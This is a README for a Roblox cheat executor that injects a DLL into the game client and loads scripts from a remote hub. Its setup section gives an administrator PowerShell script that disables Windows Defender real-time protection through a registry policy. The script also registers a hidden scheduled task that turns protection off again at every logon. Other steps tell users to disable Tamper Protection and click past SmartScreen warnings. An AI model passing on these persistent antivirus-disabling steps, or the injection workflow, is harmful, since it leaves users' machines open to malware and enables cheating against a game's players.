# EasyCheats

External Roblox executor. Launcher with a Luau editor that injects `EasyCheatsBridge.dll` into
`RobloxPlayerBeta.exe` and drives it over a named pipe.

**Do step 2 once before your first launch.** Defender removes the injected module otherwise.

---

## 1. Requirements

- Windows 10/11 64-bit, Roblox installed
- Administrator rights
- Extract the full folder, do not run from the zip

---

## 2. Turn off your antivirus

Windows Security → **Virus & threat protection** → **Manage settings**

1. **Tamper Protection** → Off
2. **Real-time protection** → Off
3. Paste this into an admin PowerShell so Windows cannot switch it back on at reboot:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
$rt = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection'
New-Item $rt -Force | Out-Null
Set-ItemProperty $rt -Name DisableRealtimeMonitoring -Value 1 -Type DWord
$act = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-NoProfile -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
Register-ScheduledTask 'EasyCheats Defender Off' -Action $act -Trigger (New-ScheduledTaskTrigger -AtLogOn) `
  -Principal (New-ScheduledTaskPrincipal "$env:USERDOMAIN\$env:USERNAME" -RunLevel Highest) -Force
```

Prefer to keep protection on? Exclude these two folders instead:

```powershell
Add-MpPreference -ExclusionPath "C:\EasyCheats"
Add-MpPreference -ExclusionPath "$env:LOCALAPPDATA\EasyCheats"
```

**Already deleted?** Virus & threat protection → **Protection history** → newest entry →
**Actions → Restore**, then do the above.

Other AV: pause its shield or add the same two folders.

---

## 3. Install

Extract to a permanent path such as `C:\EasyCheats`. Keep `EasyCheatsBridge.dll` beside the
exe — the exe cannot inject without it.

---

## 4. Launch

Right-click `EasyCheats.exe` → **Run as administrator** → Yes.

SmartScreen may say *Windows protected your PC*: **More info → Run anyway**.

Elevation is required. Start Roblox and join a game.

---

## 5. Using it

### Attach

Home tab → **Attach**. The ring turns green when the bridge has resolved its signatures and
the client is hooked. Nothing executes before this.

Attach can be started from anywhere with the attach hotkey. **Detach** drops the hook and
leaves Roblox running.

### Editor

Scripts tab. The editor has line numbers, Luau highlighting and multiple tabs.

- **New tab** — `+` in the tab strip
- **Close tab** — middle-click, or the × on the tab
- **Save** — `Ctrl+S`, to the current path
- **Save as** — into `scripts\`, so it appears in your library
- **Open recent** — Home tab, right column
- **Clear** — empties the active tab

Each tab keeps its own buffer and scroll position. Tabs survive detach.

### Execute

**Execute** runs the active tab in the client and streams `print` output into the console at
the bottom of the Scripts tab.

- **Stop All** ends every running script, including `while true do end`
- The running counter sits in the toolbar
- **Pin** keeps the console open across tab switches

### Hub

Remote script index. **Refresh** pulls the current list. Featured entries sit at the top; the
**Load** button on a card drops the source into a new tab so you can read it before running.

### Logs

Everything the injector and bridge do, in order. **Export** writes it to a file — send that
with any report. Set verbosity in Settings.

### Hotkeys

Settings → Keybinds. Click a row, press the new key. Defaults cover attach toggle, execute and
stop all, and they work while Roblox has focus.

---

## 6. Settings

| Group | Options |
| --- | --- |
| Appearance | Theme, accent, panel opacity |
| Behaviour | Log level, keybinds, confirm-on-close |
| Data | Export logs, reset config |

Config lives in `config\config.json`. Delete it to reset.

---

## 7. Troubleshooting

| Symptom | Fix |
| --- | --- |
| Attach does nothing | Roblox updated; Logs names the missed signature |
| Access denied | Relaunch as administrator |
| Files vanish or the window closes on start | AV removed them; section 2, then re-extract |
| `game` / `workspace` nil | Detach, attach again |
| Broke after reboot | Defender came back; rerun the section 2 script |

---

## 8. Files

```
EasyCheats.exe          launcher
EasyCheatsBridge.dll    injected module
config\                 settings
scripts\                your saved scripts
hub\                    remote index
resources\fonts\        UI font
```